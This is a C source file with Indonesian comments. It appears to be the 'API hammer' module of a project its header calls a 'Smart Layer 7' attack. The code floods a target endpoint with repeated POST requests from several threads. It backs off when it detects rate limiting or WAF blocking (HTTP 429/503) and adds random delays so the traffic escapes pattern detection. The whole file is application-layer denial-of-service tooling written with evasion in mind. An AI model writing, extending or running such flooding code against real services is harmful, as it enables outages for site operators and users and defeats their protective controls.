/*
 * api_hammer.c - Implementasi modul Hammering Endpoint Spesifik
 * Berdasarkan struktur proyek serangan Smart Layer 7
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include "../../include/attack/api_hammer.h"
#include "../../include/engine/http_engine.h"

// Fungsi untuk melakukan hammering pada endpoint target spesifik
int api_hammer_execute(const char *target_url, int thread_id, int requests_count) {
    printf("[API_HAMMER] Thread %d memulai hammering ke endpoint: %s sebanyak %d request\n", 
           thread_id, target_url, requests_count);
    
    for (int i = 0; i < requests_count; i++) {
        // Simulasi pengiriman request HTTP menggunakan engine
        int status_code = http_engine_send_request(target_url, "POST", "application/json");
        
        if (status_code > 0) {
            // Log sukses atau respon dari server
            if (status_code == 503 || status_code == 429) {
                // Terdeteksi pembatasan rate limit atau WAF blocking
                usleep(50000); // Backoff sebentar
            }
        }
        
        // Jeda kecil acak untuk menghindari deteksi pola linear yang kaku
        usleep(10000 + (rand() % 20000));
    }
    
    printf("[API_HAMMER] Thread %d selesai mengeksekusi target.\n", thread_id);
    return 0;
}
